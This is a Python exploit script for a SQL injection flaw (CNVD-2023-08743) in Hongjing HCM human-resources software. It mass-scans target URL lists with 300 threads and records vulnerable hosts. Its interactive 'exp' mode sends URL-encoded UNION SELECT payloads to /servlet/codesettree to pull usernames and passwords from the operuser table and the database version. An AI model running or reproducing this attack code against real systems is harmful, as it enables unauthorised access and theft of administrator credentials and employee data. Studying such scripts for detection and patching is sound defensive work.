import argparse,sys,re,requests,os
from multiprocessing.dummy import Pool
import time
#忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                         info:宏景HCM SQL注入漏洞复现 (CNVD-2023-08743)
                                         version:1.0 author:YeahSir        
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='宏景HCM SQL注入漏洞复现 (CNVD-2023-08743)')
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(300)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = '/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1'
    url = target+payload_url
    header = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding":"gzip, deflate",
        "Connection":"close",
        "Upgrade-Insecure-Requests":"1"
    }
    res = ""
    try:
        res = requests.get(url,headers=header,verify=False,timeout=5)
        #判断是否存在信息泄露
        if res.status_code == 200 and 'hongjing' in res.text and 'SQL Server' in res.text:
            
            print(f"[+]该url{target}存在漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
                return True
        else:
            print(f"[-]该url{target}不存在漏洞")
            return False
    except Exception as e:
        print(f"[*]该url{target}存在问题"+e)
        return False
    
def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        cmd = input('请输入1,2,3来执行(1.查询cusername,2.查询cpassword,3.查询数据库版本)> ')
        if cmd == 'q':
            print('Goodbye')
            break
        elif cmd in ['1', '2', '3']:
            if cmd == '1':
                payload_url = '/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d'
            elif cmd == '2':
                payload_url = '/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cpassword~20from~20operuser~20~2d~2d'
            elif cmd == '3':
                payload_url = '/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1'

            url = target + payload_url
            header = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close'
            }
            res = requests.get(url,headers=header,verify=False,timeout=5)
            if cmd == '3':
                pattern = r'text="hongjing (.*?)(&#xA;&#x9|")'  # 新的正则表达式
            else:
                pattern = r'text="(.*?)"'
            matches = re.findall(pattern, res.text)
            print(matches)
        else:
            print("无效命令，请重新输入")


if __name__ ==  '__main__':
    main()